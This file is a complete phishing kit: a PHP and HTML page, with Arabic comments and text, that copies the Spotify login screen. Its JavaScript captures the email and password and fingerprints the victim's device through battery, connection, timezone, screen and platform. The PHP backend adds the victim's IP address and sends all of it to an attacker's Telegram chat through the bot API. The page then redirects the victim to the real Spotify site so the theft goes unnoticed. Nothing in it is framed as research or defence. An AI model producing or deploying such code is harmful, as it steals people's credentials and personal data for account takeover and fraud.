<?php
// توكن البوت الخاص بك
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🎵 <b>بيانات تسجيل دخول Spotify</b>

📧 <b>البريد الإلكتروني:</b> <code>{$credentials['email']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى Spotify</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Circular', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #000000;
      color: #FFFFFF;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
      background: linear-gradient(to bottom, #1DB954, #121212);
    }
    
    .container {
      width: 100%;
      max-width: 380px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .spotify-logo {
      width: 140px;
      height: 40px;
      margin-bottom: 15px;
      fill: #FFFFFF;
    }
    
    .login-form {
      background-color: rgba(0, 0, 0, 0.7);
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
    }
    
    h1 {
      text-align: center;
      margin-bottom: 24px;
      font-size: 28px;
      font-weight: 700;
      color: #FFFFFF;
    }
    
    .subtitle {
      text-align: center;
      margin-bottom: 20px;
      font-size: 15px;
      color: #B3B3B3;
      line-height: 1.4;
    }
    
    .input-group {
      margin-bottom: 16px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #FFFFFF;
      font-weight: 600;
      text-align: right;
    }
    
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px;
      background-color: #121212;
      border: 1px solid #535353;
      border-radius: 4px;
      color: #FFFFFF;
      font-size: 15px;
      transition: border-color 0.2s;
    }
    
    input[type="email"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #1DB954;
    }
    
    .login-btn {
      width: 100%;
      padding: 14px;
      background-color: #1DB954;
      color: #FFFFFF;
      border: none;
      border-radius: 30px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.2s, transform 0.2s;
    }
    
    .login-btn:hover {
      background-color: #1ED760;
      transform: scale(1.03);
    }
    
    .links {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
    }
    
    .links a {
      color: #B3B3B3;
      text-decoration: none;
      display: block;
      margin: 10px 0;
      transition: color 0.2s;
    }
    
    .links a:hover {
      color: #FFFFFF;
      text-decoration: underline;
    }
    
    .divider {
      border-top: 1px solid #535353;
      margin: 20px 0;
      position: relative;
    }
    
    .divider-text {
      position: absolute;
      top: -9px;
      left: 50%;
      transform: translateX(-50%);
      background-color: rgba(0, 0, 0, 0.7);
      padding: 0 14px;
      color: #B3B3B3;
      font-size: 13px;
    }
    
    .signup-btn {
      width: 100%;
      padding: 14px;
      background-color: transparent;
      color: #FFFFFF;
      border: 1px solid #535353;
      border-radius: 30px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
      transition: border-color 0.2s, transform 0.2s;
    }
    
    .signup-btn:hover {
      border-color: #FFFFFF;
      transform: scale(1.03);
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #B3B3B3;
      font-size: 12px;
      line-height: 1.5;
    }
    
    .footer a {
      color: #B3B3B3;
      text-decoration: none;
      margin: 0 4px;
    }
    
    .footer a:hover {
      color: #FFFFFF;
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 18px;
        height: 18px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: #FFFFFF;
        animation: spin 1s linear infinite;
        margin: 0 auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 14px;
        font-size: 13px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #FFFFFF;
    }
    
    .error-message {
      color: #E50914;
      font-size: 13px;
      margin-top: 14px;
      text-align: center;
      display: none;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 16px;
      justify-content: flex-end;
    }
    
    .checkbox-group input[type="checkbox"] {
      margin-left: 8px;
      width: 15px;
      height: 15px;
      accent-color: #1DB954;
    }
    
    .checkbox-group label {
      margin-bottom: 0;
      font-weight: normal;
    }

    .privacy-notice {
      margin-top: 20px;
      font-size: 12px;
      color: #B3B3B3;
      text-align: center;
      line-height: 1.4;
    }

    .new-on-spotify {
      text-align: center;
      margin-bottom: 15px;
      font-size: 14px;
      color: #1DB954;
      font-weight: 600;
    }

    .social-login {
      margin-top: 20px;
      text-align: center;
    }

    .social-btn {
      display: inline-block;
      width: 40px;
      height: 40px;
      background-color: #121212;
      border-radius: 50%;
      margin: 0 8px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border: 1px solid #535353;
      transition: background-color 0.2s;
    }

    .social-btn:hover {
      background-color: #282828;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار Spotify -->
      <svg class="spotify-logo" viewBox="0 0 1675 1675" xmlns="http://www.w3.org/2000/svg">
        <path d="M838 0C375 0 0 375 0 838s375 838 838 838 838-375 838-838S1301 0 838 0zm383 1210c-15 24-47 32-71 17-196-120-442-147-733-80-27 8-54-8-62-35-8-27 8-54 35-62 320-75 596-40 821 91 24 15 32 47 17 71zm102-229c-19 30-59 40-89 22-225-138-569-178-836-97-34 10-71-8-81-42-10-34 8-71 42-81 306-93 693-46 954 112 30 18 40 59 22 89zm9-237c-268-159-711-174-974-97-43 13-90-11-103-54-13-43 11-90 54-103 311-94 795-76 1096 110 37 22 50 70 28 107-22 37-70 50-107 28z" fill="currentColor"/>
      </svg>
      <h1>تسجيل الدخول إلى Spotify</h1>
    </div>
    
    <div class="login-form">
      <div class="new-on-spotify">ليس لديك حساب؟</div>
      <p class="subtitle">استخدم حساب Spotify الخاص بك للاستماع إلى الموسيقى</p>
      
      <form id="spotifyLoginForm">
        <div class="input-group">
          <label for="email">البريد الإلكتروني أو اسم المستخدم</label>
          <input type="email" id="email" name="email" autocomplete="email" required autofocus>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="rememberMe" name="rememberMe">
          <label for="rememberMe">تذكرني</label>
        </div>
        
        <button type="submit" class="login-btn">
          <span>تسجيل الدخول</span>
          <div class="loader" id="loader"></div>
        </button>
        
        <div class="links">
          <a href="#">هل نسيت كلمة المرور؟</a>
          <a href="#">هل تواجه مشكلة في التسجيل؟</a>
        </div>
      </form>
      
      <div class="divider">
        <span class="divider-text">أو</span>
      </div>
      
      <div class="social-login">
        <a href="#" class="social-btn">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <path d="M17.64 9.2c0-.64-.06-1.25-.17-1.84H9v3.48h4.84c-.2 1.07-.82 1.98-1.75 2.58v2.2h2.84c1.66-1.53 2.61-3.78 2.61-6.42z" fill="#4285F4"/>
            <path d="M9 18c2.43 0 4.47-.8 5.96-2.18l-2.84-2.2c-.8.54-1.82.86-3.12.86-2.4 0-4.43-1.62-5.15-3.8H.87v2.27C2.33 15.75 5.38 18 9 18z" fill="#34A853"/>
            <path d="M3.85 10.68c-.18-.54-.28-1.12-.28-1.68s.1-1.14.28-1.68V5.05H.87C.32 6.15 0 7.43 0 8.8s.32 2.65.87 3.75l3.02-2.35z" fill="#FBBC05"/>
            <path d="M9 3.58c1.35 0 2.56.46 3.51 1.36l2.64-2.64C13.46.89 11.43 0 9 0 5.38 0 2.33 2.25.87 5.05l3.02 2.35C4.57 5.2 6.6 3.58 9 3.58z" fill="#EA4335"/>
          </svg>
        </a>
        <a href="#" class="social-btn">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <path d="M16 0H2C0.9 0 0 0.9 0 2v14c0 1.1 0.9 2 2 2h14c1.1 0 2-0.9 2-2V2c0-1.1-0.9-2-2-2zM9 5.5C10.93 5.5 12.5 7.07 12.5 9c0 1.93-1.57 3.5-3.5 3.5S5.5 10.93 5.5 9C5.5 7.07 7.07 5.5 9 5.5zm5.5 10H3.5V9H2v6.5h1.5V9H2V7h3.5v2.5c0 2.48 2.02 4.5 4.5 4.5s4.5-2.02 4.5-4.5V7H16v2h-1.5v6.5z" fill="white"/>
          </svg>
        </a>
        <a href="#" class="social-btn">
          <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
            <path d="M16 0H2C0.9 0 0 0.9 0 2v14c0 1.1 0.9 2 2 2h14c1.1 0 2-0.9 2-2V2c0-1.1-0.9-2-2-2zm-2.5 8.5h-1.5V7H13v1.5h-1.5V10H13v1.5h-1.5V13H11v-1.5H9.5V13H8v-1.5H6.5V13H5v-1.5H3.5V10H5V8.5H3.5V7H5V5.5h1.5V7H8V5.5h1.5V7h1.5V5.5H13V7h1.5v1.5z" fill="white"/>
          </svg>
        </a>
      </div>
      
      <div class="divider">
        <span class="divider-text">ليس لديك حساب؟</span>
      </div>
      
      <button type="button" class="signup-btn">اشترك في Spotify</button>
      
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">البريد الإلكتروني أو كلمة المرور غير صحيحة. يرجى المحاولة مرة أخرى.</div>
      
      <div class="privacy-notice">
        <p>باستخدام هذا التطبيق، فإنك توافق على <a href="#">شروط الاستخدام</a> و<a href="#">سياسة الخصوصية</a> الخاصة بنا.</p>
      </div>
    </div>
    
    <div class="footer">
      <a href="#">الخصوصية</a>
      <a href="#">ملفات تعريف الارتباط</a>
      <a href="#">الوصول</a>
      <a href="#">الدعم</a>
      <p>© 2025 Spotify AB. جميع الحقوق محفوظة.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('spotifyLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {email, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى Spotify بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://www.spotify.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
